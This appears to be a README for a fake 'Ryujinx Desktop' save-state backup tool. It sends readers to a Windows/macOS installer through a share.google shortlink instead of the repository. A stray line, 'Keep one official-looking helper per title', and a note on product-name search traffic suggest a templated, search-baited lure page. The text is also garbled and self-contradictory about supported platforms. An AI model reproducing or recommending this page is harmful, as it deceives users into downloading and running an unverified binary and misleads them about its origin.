![Ryujinx Desktop](assets/hero.png)

# Ryujinx Desktop

*Dated copies of Ryujinx save-state data, nothing uploaded.*

## What Ryujinx Desktop is

**Ryujinx Desktop** is a desktop helper. A desktop helper that finds Ryujinx save-state directories and archives config and BIOS-path files locally.

Patches move Ryujinx save-state paths without warning.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Locates Ryujinx user data on Windows and macOS.
- Archives save-state folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Ryujinx is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/ortize7273/ryujinx-desktop

MIT license. See `LICENSE`.
